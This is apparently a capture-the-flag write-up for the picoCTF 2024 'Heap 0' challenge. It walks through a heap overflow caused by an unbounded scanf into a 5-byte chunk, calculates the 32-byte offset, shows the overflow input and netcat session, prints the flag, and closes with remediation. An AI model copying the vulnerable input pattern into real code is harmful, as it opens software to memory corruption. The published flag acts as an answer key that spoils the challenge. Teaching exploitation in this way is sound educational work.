---
title: "Heap 0"
date: 2024-03-13
categories:
  - Pwn
tags:
  - Binary Exploitation
  - Heap Overflow
  - Memory Corruption
  - C
collections:
  - picoCTF
---

> **Are overflows only possible on the stack? Explore how data behaves on the heap.**

{{< admonition tldr "TL;DR" >}}
**Heap 0** is an introductory heap exploitation challenge from picoCTF 2024. The program allocates two adjacent chunks on the heap: `input_data` and `safe_var`. Reading user input via an unbounded `scanf("%s", input_data)` allows an attacker to overflow past the allocated 5-byte chunk boundary, corrupting the subsequent `safe_var` chunk and fulfilling the win condition `strcmp(safe_var, "bico") != 0`.
{{< /admonition >}}

## Source Code Analysis

We review the provided C source code (`chall.c`):

```c
#define INPUT_DATA_SIZE 5
#define SAFE_VAR_SIZE 5

char *safe_var;
char *input_data;

void check_win() {
    if (strcmp(safe_var, "bico") != 0) {
        printf("\nYOU WIN\n");
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
    }
}

void init() {
    input_data = malloc(INPUT_DATA_SIZE);
    strncpy(input_data, "pico", INPUT_DATA_SIZE);
    safe_var = malloc(SAFE_VAR_SIZE);
    strncpy(safe_var, "bico", SAFE_VAR_SIZE);
}

void write_buffer() {
    printf("Data for buffer: ");
    scanf("%s", input_data);
}
```

### Key Mechanisms

1. **Initialization (`init`):**
   - The binary calls `malloc(5)` for `input_data` and populates it with `"pico"`.
   - Immediately afterward, it calls `malloc(5)` for `safe_var` and populates it with `"bico"`.
2. **Win Condition (`check_win`):**
   - If `safe_var` is modified such that `strcmp(safe_var, "bico") != 0`, the function reads and prints `flag.txt`.
3. **The Flaw (`write_buffer`):**
   - `scanf("%s", input_data)` reads an arbitrary-length string without width limits into a 5-byte heap chunk.

---

## Memory Layout & Heap Analysis

Running option `1` (`Print Heap`) displays the dynamic heap layout:

```text
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5eb3c90b4420  ->   pico
+-------------+----------------+
[*]   0x5eb3c90b4440  ->   bico
+-------------+----------------+
```

### Offset Calculation

- `input_data` begins at `0x...420`.
- `safe_var` begins at `0x...440`.
- Distance:
  $$0x440 - 0x420 = 0x20 = 32 \text{ bytes}$$

Because of glibc malloc chunk alignment and metadata headers (chunk size and flags), the payload must travel 32 bytes to reach the data section of `safe_var`.

---

## Exploitation

To overwrite `safe_var`, we need to write at least 33 bytes:

```text
[ 32 bytes of padding ] + [ corrupting byte ]
```

### Exploitation Steps

1. Select option `2` (`Write to buffer`).
2. Input a string exceeding 32 characters, such as 40 `A`s (`AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`).
3. Select option `4` (`Print Flag`).

### Execution via Netcat

```text
$ nc tethys.picoctf.net 51234
1. Print Heap
2. Write to buffer
3. Print safe_var
4. Print Flag
5. Exit

Enter your choice: 2
Data for buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Enter your choice: 4

YOU WIN
picoCTF{b1tw^3se_0p3eR@tI0n_su33essFuL_d6f8047e}
```

---

## Flag

```text
picoCTF{b1tw^3se_0p3eR@tI0n_su33essFuL_d6f8047e}
```

---

## Remediation

1. **Enforce Width Limits on Input:** Replace unbounded `scanf("%s", ...)` with length-limited specifiers or safe functions:
   ```c
   fgets(input_data, INPUT_DATA_SIZE, stdin);
   ```
2. **Bounds Checking:** Always validate that the destination buffer has sufficient capacity before copying or reading data into it.
